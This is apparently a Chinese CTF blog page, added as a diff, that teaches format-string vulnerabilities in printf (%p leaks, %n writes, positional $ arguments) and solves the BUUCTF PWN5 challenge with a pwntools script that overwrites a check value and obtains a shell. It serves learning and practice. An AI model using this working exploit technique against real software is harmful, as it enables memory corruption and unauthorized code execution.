@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>格式化字符串漏洞 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">格式化字符串漏洞</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">五月 23, 2024&nbsp;&nbsp;21:57:28</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>格式化字符串漏洞发现于2000年左右，利用<code>printf()</code>等的输出造成内存的泄露与内存的读写。本文章主要讨论<code>printf()</code>函数</p>
+<h2 id="格式化字符串常见的语法"><a href="#格式化字符串常见的语法" class="headerlink" title="格式化字符串常见的语法"></a>格式化字符串常见的语法</h2><ul>
+<li>%d 打印 signed int</li>
+<li>%u 打印 unsigned int</li>
+<li>%s 打印参数地址所指向的字符串</li>
+<li>%x 打印十六进制整数</li>
+<li>%p 打印参数地址</li>
+<li>%c 打印一字节字符</li>
+</ul>
+<p>%<n>s 打印宽度位n的字符串，长度不够则在前面填充空格</p>
+<h3 id="长度的控制"><a href="#长度的控制" class="headerlink" title="长度的控制"></a>长度的控制</h3><ul>
+<li>%d 4字节</li>
+<li>%hd 2字节</li>
+<li>%hhd 1字节</li>
+<li>%ld 大于4字节</li>
+</ul>
+<h1 id="关于格式化字符串中的漏洞"><a href="#关于格式化字符串中的漏洞" class="headerlink" title="关于格式化字符串中的漏洞"></a>关于格式化字符串中的漏洞</h1><h2 id="关于漏洞的原理"><a href="#关于漏洞的原理" class="headerlink" title="关于漏洞的原理"></a>关于漏洞的原理</h2><p>以下为<code>printf()</code>正常用法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">100</span>] = <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后该程序会输出<code>hello,world</code>并换行</p>
+<p>但是，以下写法也能正常输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">100</span>] = <span class="string">&quot;hello,world\n&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处的输出结果依旧为<code>hello,world</code>并换行</p>
+<p>因为此处<code>printf(str)</code>和<code>printf("hello,world\n")</code>等效</p>
+<p>这就产生一个漏洞，如果str是可以被控制内容的，那么是不是就可以让<code>printf()</code>打印出他不该打印的东西</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">	gets(str);</span><br><span class="line">	<span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入<code>%p</code> 会发现<code>printf()</code>并没有打印%p而是打印出了一段地址，造成了地址的泄露</p>
+<p>因为此时<code>printf(str)</code>和<code>printf("%p")</code>等效</p>
+<h2 id="关于-n"><a href="#关于-n" class="headerlink" title="关于%n"></a>关于%n</h2><ul>
+<li>%n 将当前已经打印字符的个数写入参数地址处（4字节）</li>
+<li>%hn    2字节</li>
+<li>%hhn 1字节</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> s = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">	<span class="type">int</span>* a=(<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%10c%n&quot;</span>,s,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在第一个printf中已经打印了<code>         A</code>（九个空格加一个A）共十个字符后又把10这个值付给了int型指针a（4字节）第二个printf对a解引用发现a指向的值为10</p>
+<p>因此完整的输出结果为</p>
+<p><code>         A10</code></p>
+<h2 id="关于＄符号"><a href="#关于＄符号" class="headerlink" title="关于＄符号"></a>关于＄符号</h2><p>$ ：指定占位符</p>
+<ul>
+<li>$&lt;整数n&gt;$x 指定输出第n给参数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">	<span class="type">int</span> b=<span class="number">2</span>;</span><br><span class="line">	<span class="type">int</span> c=<span class="number">3</span>;</span><br><span class="line">	<span class="type">char</span> s[<span class="number">50</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">	<span class="built_in">printf</span>(s,a,b,c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果输入<code>%d,%d,%d </code>则会输出<code>1,2,3</code>，同样的，如果输入<code>%d</code>则只会输出<code>1</code></p>
+<p>可是，如果输入<code>%2$d</code>则会直接输出第二个参数b也就是<code>2</code></p>
+<h2 id="关于参数不足"><a href="#关于参数不足" class="headerlink" title="关于参数不足"></a>关于参数不足</h2><p>关于<code>printf()</code>我们都知道，在一般情况下，前面的百分号与后面的参数一一对应。</p>
+<p>如果参数不足会怎么样？</p>
+<p><code>printf()</code>会在寄存器和栈上一直找，直到找到能对应输出的数，这样，就会把一些隐藏的信息给打印出来。</p>
+<p>%d %u %x %p会打印地址</p>
+<p>%s 则会打印这个地址指向的位置</p>
+<p>因此<code>$</code>符号就是制造参数不足的情况 </p>
+<p>eg: <code>%100$x</code>就是对应第100个参数，参数肯定不足，<font size='1'>除非你真的给printf传了100个参数…….</font></p>
+<p>注：x86和x64架构下参数不足时泄露的东西位置有差别</p>
+<h1 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h1><p>题目：**[第五空间2019 决赛]PWN5**</p>
+<p>来源：[buuctf-PWN](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF在线评测 (buuoj.cn)</a>)</p>
+<h2 id="分析文件"><a href="#分析文件" class="headerlink" title="分析文件"></a>分析文件</h2><p><img src="/../image/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p>
+<p>32位架构开启了canary和nx保护</p>
+<p><img src="/../image/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p>
+<p>代码就是从一个文件中读取4字节的随机数存放到地址<code>0x804C044</code>中</p>
+<p>之后让你输入name 存放到buf中</p>
+<p>之后在输出一些字符串，以及buf 后让你输入passwd 存放到nptr中</p>
+<p>最后检查nptr的值和4字节的随机数是否相等</p>
+<p><img src="/../image/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.png" alt="4"></p>
+<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>由于<code>printf()</code>直接输出buf，因此可以利用格式化字符串漏洞</p>
+<p><img src="/../image/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.png" alt="5"></p>
+<p>首先输入几个<code>a</code>,在一直输入<code>%p</code>看能不能找到把a存到栈上的哪里了</p>
+<p>由于a的ascii码位0x61，因此不难发现，第十个%p的位置就是输入的那几个a</p>
+<p>因此可以直接利用%10$定位到这个位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addr1=0x804C044</span><br><span class="line">addr2=addr1+1</span><br><span class="line">addr3=addr2+1</span><br><span class="line">addr4=addr3+1</span><br><span class="line"></span><br><span class="line">payload=p32(addr1)+p32(addr2)+p32(addr3)+p32(addr4)+ &#x27;%10$n%11$n%12$n%13$n&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>从<code>0x804c044</code>往后直接利用%n修改那4字节随机数的值</p>
+<p>前面输出的地址总的字节数加起来为4+4+4+4&#x3D;16 十六进制为0x10</p>
+<p>因此每个字节都是0x10</p>
+<p>所以最后的passwd直接就是0x10101010四个16连在一块</p>
+<p>所以第二次提交数据，记得要转化成字符串形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.sendline(str(0x010101010))</span><br></pre></td></tr></table></figure>
+
+<p>最终得到shell</p>
+<p><img src="/../image/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27038</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">addr1=<span class="number">0x804C044</span></span><br><span class="line">addr2=addr1+<span class="number">1</span></span><br><span class="line">addr3=addr2+<span class="number">1</span></span><br><span class="line">addr4=addr3+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload=p32(addr1)+p32(addr2)+p32(addr3)+p32(addr4)+ <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"><span class="comment">#r.recvuntil(&quot;name:&quot;)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Hello,&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x010101010</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        <a href="/tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/05/22/pwntools%E7%9A%84%E4%BD%BF%E7%94%A8/">pwntools的使用</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
